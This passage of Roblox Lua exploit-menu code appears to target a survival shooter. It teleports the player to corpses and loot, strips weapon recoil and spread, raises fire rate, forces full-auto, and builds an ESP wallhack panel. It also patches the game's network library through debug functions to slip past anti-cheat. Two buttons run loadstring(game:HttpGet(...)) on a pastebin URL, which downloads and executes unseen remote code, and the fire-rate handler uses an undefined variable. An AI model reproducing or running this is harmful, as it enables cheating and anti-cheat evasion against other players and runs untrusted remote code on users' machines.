			game.Lighting.Sound:play()
			script.Parent.TextColor3 = Color3.fromRGB(255, 194, 39)
		else
			game.Lighting.Sound:play()
			script.Parent.TextColor3 = Color3.fromRGB(255, 255, 255)
		end
	end)
	
	

end
coroutine.resume(coroutine.create(SCRIPT_FYQG81_FAKESCRIPT))
function SCRIPT_YWPR69_FAKESCRIPT() -- Corpse.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Corpse
	script.Parent.MouseButton1Click:connect(function()
		game.Lighting.Sound:play()
			local Corpsess = game.Workspace.Corpses
				local LocalPlayer = game.Players.LocalPlayer
				local function RemoveSpaces(String)
					return String:gsub("%s+", "") or String
				end
				
				local function FindPlayer(String)
					String = RemoveSpaces(String)
					for _, _Player in pairs(Corpsess:GetChildren()) do
						if _Player.Name:lower():match('^'.. String:lower()) then
							return _Player
						end
					end
					return nil
				end
				
				
				local Target = FindPlayer(Input.Text)
					if Target and Target.HumanoidRootPart then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.CFrame
					loadstring(game:HttpGet('https://pastebin.com/raw/FaBGugbE'))() 
					wait(0.2)
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
					wait(4)
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end			
	end)

end
coroutine.resume(coroutine.create(SCRIPT_YWPR69_FAKESCRIPT))
function SCRIPT_XKXU82_FAKESCRIPT() -- Item.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Item
	script.Parent.MouseButton1Click:connect(function()
		game.Lighting.Sound:play()
		local Items = game.Workspace.Loot
		local LocalPlayer = game.Players.LocalPlayer
			
			local function FindPlayer(String)
				for i,v in pairs(Items:GetChildren()) do 
				for _, _Player in pairs(v:GetChildren()) do
					if _Player.Name:lower():match('^'.. String:lower()) then
						return _Player
					   end
					end
				end
				return nil
			end
			
			local Target = FindPlayer(TextBox.Text)
				if Target and Target.Value then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Value
					loadstring(game:HttpGet('https://pastebin.com/raw/FaBGugbE'))() 
					wait(0.2)
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
					wait(4)
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			end			
	end)

end
coroutine.resume(coroutine.create(SCRIPT_XKXU82_FAKESCRIPT))
function SCRIPT_EFVE76_FAKESCRIPT() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = TextButton
		local setupvalue = secret500 or debug.setupvalue
		local getupvalues = secret953 or debug.getupvalues
		local api;
		local framework; do
		local renv = getrenv();
		local fag = renv._G.ClientFramework
		api = debug.getupvalue(fag,'api')
		renv.settings = error;
	end
	local library = api.PreRequire('Libraries','Network')
	setupvalue(debug.getupvalues(library.Send).getKey, 'stop', error)
	debug.setupvalue(library.Add,'uhOH',library.Kill)
	local Globals = api.Shared.Globals
	script.parent.MouseButton1Down:connect(function()
	LootMode = not LootMode
		if LootMode then
			game.Lighting.Sound:play()
			script.Parent.Text = "[LOOT MODE ENABLED]"
			script.Parent.TextColor3 = Color3.fromRGB(255, 194, 39)
			game.StarterGui:SetCore("SendNotification",{
				Title = "SwiftLoot";
				Text = "Looti Mode Enabled.";
				Duration = 6
			        })
				Globals.CharacterStateNetworkRate = 999
		else
			game.Lighting.Sound:play()
			script.Parent.Text = "[LOOT MODE DISABLED]"
			script.Parent.TextColor3 = Color3.fromRGB(255, 255, 255)
			game.StarterGui:SetCore("SendNotification",{
				Title = "SwiftLoot";
				Text = "Loot Mode Disabled.";
				Duration = 6
				})
				game.Players.LocalPlayer:Kick("Looting Complete! Rejoining...")
				wait(1)
				local ts = game:GetService("TeleportService")
		     	local p = game:GetService("Players").LocalPlayer
		     	ts:Teleport(game.PlaceId, p)
		end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_EFVE76_FAKESCRIPT))
function SCRIPT_IHNQ74_FAKESCRIPT() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = TextButton_2
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
	    local delta = input.Position - dragStart
	    gui.Position = UDim2.new(0, math.clamp(startPos.X.Offset + delta.X,0,52), 0, -3)
		script.Parent.Parent.TextLabel.Text = math.floor((script.Parent.Position.X.Offset/52)*10)/10
	end
	
	gui.InputBegan:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	        dragging = true
	        dragStart = input.Position
	        startPos = gui.Position
	        
	        input.Changed:Connect(function()
	            if input.UserInputState == Enum.UserInputState.End then
	                dragging = false
	            end
	        end)
	    end
	end)
	
	gui.InputChanged:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	        dragInput = input
	    end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
	    if input == dragInput and dragging then
	        update(input)
	    end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_IHNQ74_FAKESCRIPT))
function SCRIPT_ELUM69_FAKESCRIPT() -- TextLabel.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = TextLabel
	local old = {}
	for i,v in pairs(game:GetService("ReplicatedStorage").Shared.ItemData.Firearms:GetChildren()) do
		old[v.Name]= require(v['Recoil Data'])
	end
	script.Parent:GetPropertyChangedSignal('Text'):connect(function()
		game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "GunMods";
				Text = "Recoil Modified.";
				Duration = 6
	        })
		for i,v in pairs(game:GetService("ReplicatedStorage").Shared.ItemData.Firearms:GetChildren()) do
			local mod = require(v['Recoil Data'])
			mod.SpreadAddFPSZoom = old[v.Name].SpreadAddFPSZoom - old[v.Name].SpreadAddFPSZoom * script.Parent.Text
			mod.SpreadAddFPSHip = old[v.Name].SpreadAddFPSHip - old[v.Name].SpreadAddFPSHip * script.Parent.Text
			mod.SpreadAddTPSZoom = old[v.Name].SpreadAddTPSZoom - old[v.Name].SpreadAddTPSZoom * script.Parent.Text
			mod.SpreadAddTPSHip = old[v.Name].SpreadAddTPSHip - old[v.Name].SpreadAddTPSHip * script.Parent.Text
		end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_ELUM69_FAKESCRIPT))
function SCRIPT_FMPO88_FAKESCRIPT() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = TextButton_3
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
	    local delta = input.Position - dragStart
	    gui.Position = UDim2.new(0, math.clamp(startPos.X.Offset + delta.X,0,52), 0, -3)
		script.Parent.Parent.TextLabel.Text = math.floor((script.Parent.Position.X.Offset/52)*10)/10
	end
	
	gui.InputBegan:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	        dragging = true
	        dragStart = input.Position
	        startPos = gui.Position
	        
	        input.Changed:Connect(function()
	            if input.UserInputState == Enum.UserInputState.End then
	                dragging = false
	            end
	        end)
	    end
	end)
	
	gui.InputChanged:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	        dragInput = input
	    end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
	    if input == dragInput and dragging then
	        update(input)
	    end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_FMPO88_FAKESCRIPT))
function SCRIPT_VRSN74_FAKESCRIPT() -- TextLabel_2.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = TextLabel_2
	local old = {}
	for i,v in pairs(game:GetService("ReplicatedStorage").Shared.ItemData.Firearms:GetChildren()) do
		old[v.Name]= require(v['Recoil Data'])
	end
	script.Parent:GetPropertyChangedSignal('Text'):connect(function()
		game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "GunMods";
				Text = "Spread Modified.";
				Duration = 6
	        })
		for i,v in pairs(game:GetService("ReplicatedStorage").Shared.ItemData.Firearms:GetChildren()) do
			local mod = require(v['Recoil Data'])
			mod.KickUpForce = old[v.Name].KickUpForce - old[v.Name].KickUpForce * script.Parent.Text
			mod.ShiftCameraInfluence = old[v.Name].ShiftCameraInfluence - old[v.Name].ShiftCameraInfluence * script.Parent.Text
			mod.ShiftGunInfluence = old[v.Name].ShiftGunInfluence - old[v.Name].ShiftGunInfluence * script.Parent.Text
			mod.RaiseForce = old[v.Name].RaiseForce - old[v.Name].RaiseForce * script.Parent.Text
			mod.RaiseSpeed = old[v.Name].RaiseSpeed - old[v.Name].RaiseSpeed * script.Parent.Text
			mod.RaiseBounce = old[v.Name].RaiseBounce - old[v.Name].RaiseBounce * script.Parent.Text
			mod.RaiseInfluence = old[v.Name].RaiseInfluence - old[v.Name].RaiseInfluence * script.Parent.Text
			
		end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_VRSN74_FAKESCRIPT))
function SCRIPT_LGPT74_FAKESCRIPT() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = TextButton_4
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
	    local delta = input.Position - dragStart
	    gui.Position = UDim2.new(0, math.clamp(startPos.X.Offset + delta.X,0,52), 0, -3)
		script.Parent.Parent.TextLabel.Text = math.floor((script.Parent.Position.X.Offset/52)*10)/10
	end
	
	gui.InputBegan:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	        dragging = true
	        dragStart = input.Position
	        startPos = gui.Position
	        
	        input.Changed:Connect(function()
	            if input.UserInputState == Enum.UserInputState.End then
	                dragging = false
	            end
	        end)
	    end
	end)
	
	gui.InputChanged:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	        dragInput = input
	    end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
	    if input == dragInput and dragging then
	        update(input)
	    end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_LGPT74_FAKESCRIPT))
function SCRIPT_CTBB78_FAKESCRIPT() -- TextLabel_3.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = TextLabel_3
	local old = {}
	for i,v in pairs(game:GetService("ReplicatedStorage").Shared.ItemData.Firearms:GetChildren()) do
		old[v.Name]= require(v)
	end
	script.Parent:GetPropertyChangedSignal('Text'):connect(function()
		game.Lighting.Sound:play()
			game.StarterGui:SetCore("SendNotification",{
				Title = "GunMods";
				Text = "Fire Rate Modified.";
				Duration = 6
	        })
		for i,v in pairs(game:GetService("ReplicatedStorage").Shared.ItemData.Firearms:GetChildren()) do
			mod.FireRate = v.FireRate + v.FireRate * (1000* script.Parent.Text)
		end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_CTBB78_FAKESCRIPT))
function SCRIPT_OFGE72_FAKESCRIPT() -- FullAuto.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = FullAuto
	script.Parent.MouseButton1Down:connect(function()
		game.Lighting.Sound:play()
		game.StarterGui:SetCore("SendNotification",{
				Title = "GunMods";
				Text = "Full Auto Mod Activated.";
				Duration = 6
	        })
		for i,v in pairs(game:GetService("ReplicatedStorage").Shared.ItemData.Firearms:GetChildren()) do
			local mod = require(v)
			mod.FireModes = {'Automatic'}
		end
	end)
	

end
coroutine.resume(coroutine.create(SCRIPT_OFGE72_FAKESCRIPT))
function SCRIPT_IPXQ79_FAKESCRIPT() -- GunName.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = GunName
	script.Parent.FocusLost:connect(function(a)
		if a then
			game.Lighting.Sound:play()
				game.StarterGui:SetCore("SendNotification",{
				Title = "GunMods";
				Text = "Gun Name Set.";
				Duration = 6
	        })
			for i,v in pairs(game:GetService("ReplicatedStorage").Shared.ItemData.Firearms:GetChildren()) do
				local c = require(v)
				c.DisplayName = script.Parent.Text
			end
		end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_IPXQ79_FAKESCRIPT))
function SCRIPT_PYFT89_FAKESCRIPT() -- GunDesc.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = GunDesc
	script.Parent.FocusLost:connect(function(a)
		if a then
			game.Lighting.Sound:play()
				game.StarterGui:SetCore("SendNotification",{
				Title = "GunMods";
				Text = "Gun Description Set.";
				Duration = 6
	        })
			for i,v in pairs(game:GetService("ReplicatedStorage").Shared.ItemData.Firearms:GetChildren()) do
				local c = require(v)
				c.Description = script.Parent.Text
			end
		end
	end)

end
coroutine.resume(coroutine.create(SCRIPT_PYFT89_FAKESCRIPT))
function SCRIPT_ZBST85_FAKESCRIPT() -- ESP.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = ESP
	local ESP = Instance.new("ScreenGui")
	local Main = Instance.new("Frame")
	local TitleMain = Instance.new("TextLabel")
	local HideMain = Instance.new("TextButton")
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
	local FrameSet = Instance.new("Frame")
	local List = Instance.new("ScrollingFrame")
	local UIListLayout = Instance.new("UIListLayout")
	local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
	local KeySet_ESP = Instance.new("ImageButton")
	local TitleKeySetESP = Instance.new("TextLabel")
	local KeySet = Instance.new("TextLabel")
	local KeySet_Hide = Instance.new("ImageButton")
	local TitleKeySetHide = Instance.new("TextLabel")
	local KeySetH = Instance.new("TextLabel")
	local SetDist = Instance.new("TextBox")
	local TitleSetDist = Instance.new("TextLabel")
	local SetDistPlrDet = Instance.new("TextBox")
	local TitleSetDist_2 = Instance.new("TextLabel")
	local SetDistZedDet = Instance.new("TextBox")
	local TitleSetDist_3 = Instance.new("TextLabel")
	local FramePL = Instance.new("Frame")
	local PlayerList = Instance.new("ScrollingFrame")
	local UIListLayout_2 = Instance.new("UIListLayout")
	local TitleE = Instance.new("TextLabel")
	local TitleB = Instance.new("TextLabel")
	local TitleI = Instance.new("TextLabel")
	local TitlePL = Instance.new("TextLabel")
	local FrameIS = Instance.new("Frame")
	local Results = Instance.new("ScrollingFrame")
	local UIListLayout_3 = Instance.new("UIListLayout")
	local NoResults = Instance.new("TextLabel")
	local SearchBox = Instance.new("TextBox")
	local Clear = Instance.new("TextButton")
	local TogglePESP = Instance.new("TextButton")
	local ToggleZESP = Instance.new("TextButton")
	local ToggleSettings = Instance.new("ImageButton")
	local TogglePlayerList = Instance.new("TextButton")
	local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
	local ToggleItemESP = Instance.new("TextButton")
	local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
	local HitBox = Instance.new("ImageLabel")
	local OutTop = Instance.new("ImageLabel")
	local OutBot = Instance.new("ImageLabel")
	local OutLeft = Instance.new("ImageLabel")
	local OutRight = Instance.new("ImageLabel")
	local Templates = Instance.new("Folder",Main)
	--Properties:
	ESP.Name = "SLEP"
	ESP.Parent = game.CoreGui
	ESP.DisplayOrder = 1
	ESP.ResetOnSpawn = false
	
	Main.Name = "Main"
	Main.Parent = game.Players.LocalPlayer.PlayerGui["Paragon"].ImageLabel.ESP
	Main.Active = true
	Main.AnchorPoint = Vector2.new(0.5, 0.5)
	Main.BackgroundColor3 = Color3.new(0, 0, 0)
	Main.BackgroundTransparency = 0.40000000596046
	Main.BorderSizePixel = 0
	Main.Position = UDim2.new(0.7, 0, 0.2, 0)
	Main.Size = UDim2.new(0.34,0,0.07, 0)
	Main.SizeConstraint = Enum.SizeConstraint.RelativeYY
	
	TitleMain.Name = "TitleMain"
	TitleMain.Parent = Main
	TitleMain.BackgroundColor3 = Color3.new(0, 0, 0)
	TitleMain.BackgroundTransparency = 0.40000000596046
	TitleMain.BorderSizePixel = 0
	TitleMain.Position = UDim2.new(0, 0, -0.620000005, 0)
	TitleMain.Size = UDim2.new(1, 0, 0.100000001, 0)
	TitleMain.SizeConstraint = Enum.SizeConstraint.RelativeXX
	TitleMain.Font = Enum.Font.SourceSans
	TitleMain.Text = "ESP"
	TitleMain.TextColor3 = Color3.new(1, 1, 1)
	TitleMain.TextScaled = true
	TitleMain.TextSize = 20
	TitleMain.TextWrapped = true
	
	HideMain.Name = "HideMain"
	HideMain.Parent = TitleMain
	HideMain.AnchorPoint = Vector2.new(1, 1)
	HideMain.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	HideMain.BackgroundTransparency = 1
	HideMain.BorderSizePixel = 0
	HideMain.Position = UDim2.new(1, -5, 1, 0)
	HideMain.Size = UDim2.new(0, 25, 0, 20)
	HideMain.Visible = false
	HideMain.Font = Enum.Font.Code
	HideMain.Text = "-"
	HideMain.TextColor3 = Color3.new(1, 1, 1)
	HideMain.TextSize = 20
	
	UITextSizeConstraint.Parent = TitleMain
	UITextSizeConstraint.MaxTextSize = 30
	
	FrameSet.Name = "FrameSet"
	FrameSet.Parent = Main
	FrameSet.Active = true
	FrameSet.BackgroundColor3 = Color3.new(0, 0, 0)
	FrameSet.BackgroundTransparency = 0.40000000596046
	FrameSet.BorderSizePixel = 0
	FrameSet.Position = UDim2.new(0, 0, 1.60000002, 0)
	FrameSet.Size = UDim2.new(1, 0, 0.800000012, 0)
	FrameSet.SizeConstraint = Enum.SizeConstraint.RelativeXX
	FrameSet.ClipsDescendants = true
	FrameSet.Visible = false
	
	List.Name = "List"
	List.Parent = FrameSet
	List.AnchorPoint = Vector2.new(0.5, 1)
	List.BackgroundColor3 = Color3.new(1, 1, 1)
	List.BackgroundTransparency = 1
	List.BorderSizePixel = 0
	List.Position = UDim2.new(0.5, 0, 0.959999979, 0)
	List.Size = UDim2.new(0.949999988, 0, 0.899999976, 0)
	List.CanvasSize = UDim2.new(0, 0, 3, 0)
	List.ScrollBarThickness = 3
	
	UIListLayout.Parent = List
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0.0149999997, 0)
	
	UIAspectRatioConstraint.Parent = UIListLayout
	
	KeySet_ESP.Name = "KeySet_ESP"
	KeySet_ESP.Parent = List
	KeySet_ESP.BackgroundColor3 = Color3.new(1, 1, 1)
	KeySet_ESP.BackgroundTransparency = 1
	KeySet_ESP.Position = UDim2.new(0, 5, 0, 30)
	KeySet_ESP.Size = UDim2.new(0, 30, 0, 30)
	KeySet_ESP.Image = "rbxassetid://2468226666"
	KeySet_ESP.ImageColor3 = Color3.new(0.780392, 0.780392, 0.780392)
	
	TitleKeySetESP.Name = "TitleKeySetESP"
	TitleKeySetESP.Parent = KeySet_ESP
	TitleKeySetESP.AnchorPoint = Vector2.new(0, 0.5)
	TitleKeySetESP.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	TitleKeySetESP.BackgroundTransparency = 1
	TitleKeySetESP.BorderSizePixel = 0
	TitleKeySetESP.Position = UDim2.new(1, 5, 0.5, 0)
	TitleKeySetESP.Size = UDim2.new(0, 200, 0, 20)
	TitleKeySetESP.Font = Enum.Font.SourceSansItalic
	TitleKeySetESP.Text = "Keybind -- Refresh key for the ESP"
	TitleKeySetESP.TextColor3 = Color3.new(1, 1, 1)
	TitleKeySetESP.TextSize = 17
	TitleKeySetESP.TextXAlignment = Enum.TextXAlignment.Left
	
	KeySet.Name = "KeySet"
	KeySet.Parent = KeySet_ESP
	KeySet.AnchorPoint = Vector2.new(0.5, 0.5)
	KeySet.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	KeySet.BackgroundTransparency = 1
	KeySet.BorderSizePixel = 0
	KeySet.Position = UDim2.new(0.5, 0, 0.5, 0)
	KeySet.Size = UDim2.new(0, 30, 0, 30)
	KeySet.Font = Enum.Font.SourceSansBold
	KeySet.Text = "E"
	KeySet.TextColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	KeySet.TextSize = 22
	
	KeySet_Hide.Name = "KeySet_Hide"
	KeySet_Hide.Parent = List
	KeySet_Hide.BackgroundColor3 = Color3.new(1, 1, 1)
	KeySet_Hide.BackgroundTransparency = 1
	KeySet_Hide.Position = UDim2.new(0, 5, 0, 65)
	KeySet_Hide.Size = UDim2.new(0, 30, 0, 30)
	KeySet_Hide.Image = "rbxassetid://2468226666"
	KeySet_Hide.ImageColor3 = Color3.new(0.780392, 0.780392, 0.780392)
	
	TitleKeySetHide.Name = "TitleKeySetHide"
	TitleKeySetHide.Parent = KeySet_Hide
	TitleKeySetHide.AnchorPoint = Vector2.new(0, 0.5)
	TitleKeySetHide.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	TitleKeySetHide.BackgroundTransparency = 1
	TitleKeySetHide.BorderSizePixel = 0
	TitleKeySetHide.Position = UDim2.new(1, 5, 0.5, 0)
	TitleKeySetHide.Size = UDim2.new(0, 200, 0, 20)
	TitleKeySetHide.Font = Enum.Font.SourceSansItalic
	TitleKeySetHide.Text = "Keybind -- Hides the ESP menu"
	TitleKeySetHide.TextColor3 = Color3.new(1, 1, 1)
	TitleKeySetHide.TextSize = 17
	TitleKeySetHide.TextXAlignment = Enum.TextXAlignment.Left
	
	KeySetH.Name = "KeySetH"
	KeySetH.Parent = KeySet_Hide
	KeySetH.AnchorPoint = Vector2.new(0.5, 0.5)
	KeySetH.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	KeySetH.BackgroundTransparency = 1
	KeySetH.BorderSizePixel = 0
	KeySetH.Position = UDim2.new(0.5, 0, 0.5, 0)
	KeySetH.Size = UDim2.new(0, 30, 0, 30)
	KeySetH.Font = Enum.Font.SourceSansBold
	KeySetH.Text = "~"
	KeySetH.TextColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	KeySetH.TextSize = 22
	
	SetDist.Name = "SetDist"
	SetDist.Parent = List
	SetDist.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	SetDist.BorderSizePixel = 0
	SetDist.Position = UDim2.new(0, 5, 0, 100)
	SetDist.Size = UDim2.new(0, 30, 0, 30)
	SetDist.Font = Enum.Font.SourceSansBold
	SetDist.Text = "9999"
	SetDist.TextColor3 = Color3.new(1, 1, 1)
	SetDist.TextScaled = true
	SetDist.TextSize = 14
	SetDist.TextWrapped = true
	
	TitleSetDist.Name = "TitleSetDist"
	TitleSetDist.Parent = SetDist
	TitleSetDist.AnchorPoint = Vector2.new(0, 0.5)
	TitleSetDist.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	TitleSetDist.BackgroundTransparency = 1
	TitleSetDist.BorderSizePixel = 0
	TitleSetDist.Position = UDim2.new(1, 5, 0.5, 0)
	TitleSetDist.Size = UDim2.new(0, 200, 0, 20)
	TitleSetDist.Font = Enum.Font.SourceSansItalic
	TitleSetDist.Text = "NumValue -- Max distance ESP will show"
	TitleSetDist.TextColor3 = Color3.new(1, 1, 1)
	TitleSetDist.TextSize = 17
	TitleSetDist.TextXAlignment = Enum.TextXAlignment.Left
	
	SetDistPlrDet.Name = "SetDistPlrDet"
	SetDistPlrDet.Parent = List
	SetDistPlrDet.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	SetDistPlrDet.BorderSizePixel = 0
	SetDistPlrDet.Position = UDim2.new(0, 5, 0, 135)
	SetDistPlrDet.Size = UDim2.new(0, 30, 0, 30)
	SetDistPlrDet.Font = Enum.Font.SourceSansBold
	SetDistPlrDet.Text = "250"
	SetDistPlrDet.TextColor3 = Color3.new(1, 1, 1)
	SetDistPlrDet.TextScaled = true
	SetDistPlrDet.TextSize = 14
	SetDistPlrDet.TextWrapped = true
	
	TitleSetDist_2.Name = "TitleSetDist"
	TitleSetDist_2.Parent = SetDistPlrDet
	TitleSetDist_2.AnchorPoint = Vector2.new(0, 0.5)
	TitleSetDist_2.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	TitleSetDist_2.BackgroundTransparency = 1
	TitleSetDist_2.BorderSizePixel = 0
	TitleSetDist_2.Position = UDim2.new(1, 5, 0.5, 0)
	TitleSetDist_2.Size = UDim2.new(0, 200, 0, 20)
	TitleSetDist_2.Font = Enum.Font.SourceSansItalic
	TitleSetDist_2.Text = "NumValue -- Max distance ESP will show"
	TitleSetDist_2.TextColor3 = Color3.new(1, 1, 1)
	TitleSetDist_2.TextSize = 17
	TitleSetDist_2.TextXAlignment = Enum.TextXAlignment.Left
	
	SetDistZedDet.Name = "SetDistZedDet"
	SetDistZedDet.Parent = List
	SetDistZedDet.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	SetDistZedDet.BorderSizePixel = 0
	SetDistZedDet.Position = UDim2.new(0, 5, 0, 170)
	SetDistZedDet.Size = UDim2.new(0, 30, 0, 30)
	SetDistZedDet.Font = Enum.Font.SourceSansBold
	SetDistZedDet.Text = "100"
	SetDistZedDet.TextColor3 = Color3.new(1, 1, 1)
	SetDistZedDet.TextScaled = true
	SetDistZedDet.TextSize = 14
	SetDistZedDet.TextWrapped = true
	
	TitleSetDist_3.Name = "TitleSetDist"
	TitleSetDist_3.Parent = SetDistZedDet
	TitleSetDist_3.AnchorPoint = Vector2.new(0, 0.5)
	TitleSetDist_3.BackgroundColor3 = Color3.new(0.211765, 0.211765, 0.211765)
	TitleSetDist_3.BackgroundTransparency = 1
	TitleSetDist_3.BorderSizePixel = 0
	TitleSetDist_3.Position = UDim2.new(1, 5, 0.5, 0)
	TitleSetDist_3.Size = UDim2.new(0, 200, 0, 20)
	TitleSetDist_3.Font = Enum.Font.SourceSansItalic
	TitleSetDist_3.Text = "NumValue -- Max distance ESP will show"
	TitleSetDist_3.TextColor3 = Color3.new(1, 1, 1)
	TitleSetDist_3.TextSize = 17
	TitleSetDist_3.TextXAlignment = Enum.TextXAlignment.Left
	
	FramePL.Name = "FramePL"
	FramePL.Parent = Main
	FramePL.Active = true
	FramePL.AnchorPoint = Vector2.new(0.5, 0)
	FramePL.BackgroundColor3 = Color3.new(0, 0, 0)
	FramePL.BackgroundTransparency = 0.40000000596046
	FramePL.BorderSizePixel = 0
	FramePL.Position = UDim2.new(0.5, 0, 1.60000002, 0)
	FramePL.Size = UDim2.new(1, 0, 0.800000012, 0)
	FramePL.SizeConstraint = Enum.SizeConstraint.RelativeXX
	FramePL.ClipsDescendants = true
	FramePL.Visible = false
	
	PlayerList.Name = "PlayerList"
	PlayerList.Parent = FramePL
	PlayerList.AnchorPoint = Vector2.new(0.5, 1)
	PlayerList.BackgroundColor3 = Color3.new(1, 1, 1)
	PlayerList.BackgroundTransparency = 1
	PlayerList.BorderSizePixel = 0
	PlayerList.Position = UDim2.new(0.5, 0, 0.959999979, 0)
	PlayerList.Size = UDim2.new(0.949999988, 0, 0.839999974, 0)
	PlayerList.CanvasSize = UDim2.new(0, 0, 3, 0)
	PlayerList.ScrollBarThickness = 3
	
	UIListLayout_2.Parent = PlayerList
	UIListLayout_2.Padding = UDim.new(0, 5)
	
	TitleE.Name = "TitleE"
	TitleE.Parent = FramePL
	TitleE.BackgroundColor3 = Color3.new(1, 1, 1)
	TitleE.BackgroundTransparency = 1
	TitleE.Position = UDim2.new(0.0199999996, 0, 0.00999999978, 0)
	TitleE.Size = UDim2.new(0.0500000007, 0, 0.0900000036, 0)
	TitleE.SizeConstraint = Enum.SizeConstraint.RelativeYY
	TitleE.Font = Enum.Font.SourceSansBold
	TitleE.Text = "E"
	TitleE.TextColor3 = Color3.new(1, 1, 1)
	TitleE.TextScaled = true
	TitleE.TextSize = 14
	TitleE.TextWrapped = true
	
	TitleB.Name = "TitleB"
	TitleB.Parent = FramePL
	TitleB.BackgroundColor3 = Color3.new(1, 1, 1)
	TitleB.BackgroundTransparency = 1
	TitleB.Position = UDim2.new(0.100000001, 0, 0.00999999978, 0)
	TitleB.Size = UDim2.new(0.0500000007, 0, 0.0900000036, 0)
	TitleB.SizeConstraint = Enum.SizeConstraint.RelativeYY
	TitleB.Font = Enum.Font.SourceSansBold
	TitleB.Text = "B"
	TitleB.TextColor3 = Color3.new(1, 1, 1)
	TitleB.TextScaled = true
	TitleB.TextSize = 14
	TitleB.TextWrapped = true
	
	TitleI.Name = "TitleI"
	TitleI.Parent = FramePL
	TitleI.BackgroundColor3 = Color3.new(1, 1, 1)
	TitleI.BackgroundTransparency = 1
	TitleI.Position = UDim2.new(0.174999997, 0, 0.00999999978, 0)
	TitleI.Size = UDim2.new(0.0500000007, 0, 0.0900000036, 0)
	TitleI.SizeConstraint = Enum.SizeConstraint.RelativeYY
	TitleI.Font = Enum.Font.SourceSansBold
	TitleI.Text = "I"
	TitleI.TextColor3 = Color3.new(1, 1, 1)
	TitleI.TextScaled = true
	TitleI.TextSize = 14
	TitleI.TextWrapped = true
	
	TitlePL.Name = "TitlePL"
	TitlePL.Parent = FramePL
	TitlePL.AnchorPoint = Vector2.new(1, 0)
	TitlePL.BackgroundColor3 = Color3.new(1, 1, 1)
	TitlePL.BackgroundTransparency = 1
	TitlePL.Position = UDim2.new(0.899999976, 0, 0.0199999996, 0)
	TitlePL.Size = UDim2.new(0.75999999, 0, 0.0799999982, 0)
	TitlePL.SizeConstraint = Enum.SizeConstraint.RelativeYY
	TitlePL.Font = Enum.Font.SourceSans
	TitlePL.Text = "PLAYER NAME"
	TitlePL.TextColor3 = Color3.new(1, 1, 1)
	TitlePL.TextScaled = true
	TitlePL.TextSize = 14
	TitlePL.TextWrapped = true
	
	FrameIS.Name = "FrameIS"
	FrameIS.Parent = Main
	FrameIS.Active = true
	FrameIS.AnchorPoint = Vector2.new(0.5, 0)
	FrameIS.BackgroundColor3 = Color3.new(0, 0, 0)
	FrameIS.BackgroundTransparency = 0.40000000596046
	FrameIS.BorderSizePixel = 0
